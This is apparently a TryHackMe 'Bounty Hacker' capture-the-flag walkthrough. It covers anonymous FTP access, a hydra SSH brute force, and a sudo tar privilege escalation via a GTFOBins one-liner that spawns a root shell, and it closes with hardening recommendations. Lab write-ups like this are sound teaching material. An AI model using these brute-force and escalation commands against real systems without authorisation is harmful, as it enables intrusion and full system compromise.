🔐 TryHackMe - Bounty Hacker CTF Walkthrough
https://img.shields.io/badge/TryHackMe-Bounty%2520Hacker-red
https://img.shields.io/badge/Difficulty-Easy-green
https://img.shields.io/badge/Category-CTF-blue
https://img.shields.io/badge/OS-Linux-orange

Solved By: Prince 👑
Date: 2025-10-05
Platform: TryHackMe

📋 Executive Summary
This walkthrough details the complete penetration testing methodology for the Bounty Hacker CTF machine. The engagement demonstrates a classic attack chain starting with anonymous FTP access, leading to credential discovery, SSH brute-forcing, and privilege escalation through misconfigured sudo permissions.

🎯 Attack Flow Overview
graph TD
    A[Reconnaissance] --> B[FTP Anonymous Login]
    B --> C[Credential Discovery]
    C --> D[SSH Brute Force]
    D --> E[Initial Foothold]
    E --> F[Privilege Escalation]
    F --> G[Root Compromise]






🔍 Phase 1: Initial Reconnaissance
Network Scanning
Performed comprehensive Nmap scan to identify open ports and services:

bash
nmap -sV -A target_ip -Pn
📊 Scan Results:

Port 21/tcp: FTP vsftpd 3.0.3

Port 22/tcp: SSH OpenSSH 7.2p2 Ubuntu

Port 80/tcp: HTTP Apache httpd 2.4.18

https://via.placeholder.com/600x200/2c3e50/ffffff?text=Nmap+Scan+Results

📁 Phase 2: FTP Service Enumeration
Anonymous FTP Access
Discovered that FTP service allows anonymous login:

bash
ftp target_ip
Name: anonymous
Password: [blank or anonymous]
📁 Files Discovered:

locks.txt - Potential password list

tasks.txt - Task list containing user information

File Analysis
locks.txt:

text
password1
123456
qwerty
admin
letmein
...
tasks.txt:

text
Task list for new employees:
- Set up FTP server
- Configure Apache
- Schedule system updates
- Contact lin for SSH access
🔍 Key Finding: Username lin identified for SSH access

🌐 Phase 3: Web Service Enumeration
HTTP Service Analysis
Accessed port 80 via web browser

Performed thorough enumeration:

Source code analysis

Robots.txt check

Directory brute-forcing

📝 Observation: No critical information found on web service

🔑 Phase 4: Credential Generation & SSH Brute Force
Password List Generation
Used cewl to create custom wordlist from web content:

bash
cewl http://target_ip -w custom_passwords.txt
SSH Brute Force Attack
Combined discovered username lin with password lists:

bash
hydra -l lin -P locks.txt ssh://target_ip
🎯 Successful Credentials:

Username: lin

Password: [Discovered from locks.txt]

https://via.placeholder.com/600x200/27ae60/ffffff?text=SSH+Login+Successful

🐚 Phase 5: Initial Foothold & Enumeration
SSH Access
Successfully logged into the system:

bash
ssh lin@target_ip
System Enumeration
Performed basic enumeration to understand the system:

bash
whoami
id
pwd
ls -la
⬆️ Phase 6: Privilege Escalation
Sudo Privilege Check
Checked user's sudo permissions:

bash
sudo -l
📋 Sudo Privileges Found:

text
User lin may run the following commands on bountyhacker:
    (root) /bin/tar
GTFOBins Exploitation
Referenced GTFOBins for tar command privilege escalation:

bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
✅ Root Access Obtained!

https://via.placeholder.com/600x200/e74c3c/ffffff?text=Privilege+Escalation+Successful

🏴 Phase 7: Flag Capture
User Flag
Located in user's home directory:

bash
cat /home/lin/user.txt
Root Flag
Located in root directory:

bash
cat /root/root.txt
https://via.placeholder.com/600x200/8e44ad/ffffff?text=Both+Flags+Captured

🛡️ Security Findings & Recommendations
Critical Vulnerabilities Identified:
Anonymous FTP Access

FTP service allowed anonymous login with read access

Risk: Information disclosure

Recommendation: Disable anonymous FTP access

Weak Password Policy

Simple passwords stored in accessible files

Risk: Credential compromise

Recommendation: Implement strong password policies

Sudo Misconfiguration

Tar command allowed with root privileges

Risk: Privilege escalation

Recommendation: Review and restrict sudo permissions

Attack Chain Mitigation:
Attack Phase	Mitigation Strategy
FTP Enumeration	Disable anonymous access
Credential Discovery	Secure sensitive files
SSH Brute Force	Implement fail2ban, key-based auth
Privilege Escalation	Principle of least privilege
🛠️ Tools Used
Nmap - Network scanning

FTP Client - File transfer protocol

Cewl - Custom wordlist generation

Hydra - SSH brute force

GTFOBins - Privilege escalation reference

📚 References
GTFOBins - tar

Vsftpd Configuration Guide

SSH Hardening Guide

🎖️ Conclusion
The Bounty Hacker CTF demonstrated a realistic attack scenario where multiple service misconfigurations led to complete system compromise. The engagement highlighted the importance of proper service configuration, strong credential management, and the principle of least privilege for sudo permissions.

Key Takeaways:

Anonymous services often lead to initial foothold

Reused credentials across services create attack chains


Sudo misconfigurations are common privilege escalation vectors
